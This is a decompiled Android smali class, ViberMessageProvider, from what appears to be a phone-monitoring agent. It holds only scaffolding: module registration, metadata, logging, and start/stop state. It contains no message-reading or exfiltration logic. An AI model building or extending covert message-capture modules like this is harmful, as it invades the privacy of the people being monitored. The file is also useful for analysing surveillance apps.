.class public Lcom/hp/vd/module/monitor/ViberMessageProvider;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "ViberMessageProvider.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "ViberMessageProvider"


# instance fields
.field protected isStarted:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 14
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 18
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/ViberMessageProvider;->isStarted:Z

    return-void
.end method


# virtual methods
.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 22
    const-class v0, Lcom/hp/vd/data/ViberMessageData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 58
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 60
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 61
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 62
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 63
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ViberMessageProvider;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x2

    .line 64
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v2.0"

    .line 65
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data=text;"

    .line 66
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    const/16 v1, 0x11

    .line 69
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 70
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 72
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "ViberMessageProvider"

    return-object v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 4

    .line 27
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ViberMessageProvider;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 34
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ViberMessageProvider;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1

    .line 36
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ViberMessageProvider;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    .line 38
    iput-object p1, v2, Lcom/hp/vd/data/ModuleData;->packagePath:Ljava/lang/String;

    .line 39
    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    iput-object v3, v2, Lcom/hp/vd/data/ModuleData;->installedOn:Ljava/util/Date;

    .line 41
    invoke-interface {v1, v2}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    const-string v1, "ViberMessageProvider"

    .line 43
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "install("

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "): module registered."

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    const/16 p1, 0x96

    .line 51
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/ViberMessageProvider;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string v1, "ViberMessageProvider"

    const-string v2, "install(): Base installation failed."

    .line 46
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 p1, 0x0

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 113
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/ViberMessageProvider;->isStarted:Z

    return v0
.end method

.method public start()Z
    .locals 4

    .line 80
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ViberMessageProvider;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "ViberMessageProvider"

    const-string v2, "start() called."

    .line 81
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 83
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ViberMessageProvider;->isActivated()Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "ViberMessageProvider"

    const-string v3, "start(): This module is currently DEactivated."

    .line 84
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 89
    :cond_0
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/ViberMessageProvider;->isStarted:Z

    const/4 v1, 0x1

    if-ne v0, v1, :cond_1

    return v2

    .line 93
    :cond_1
    iput-boolean v1, p0, Lcom/hp/vd/module/monitor/ViberMessageProvider;->isStarted:Z

    return v1
.end method

.method public stop()Z
    .locals 2

    .line 101
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/ViberMessageProvider;->isStarted:Z

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 102
    iput-boolean v1, p0, Lcom/hp/vd/module/monitor/ViberMessageProvider;->isStarted:Z

    const/4 v0, 0x1

    return v0

    :cond_0
    return v1
.end method
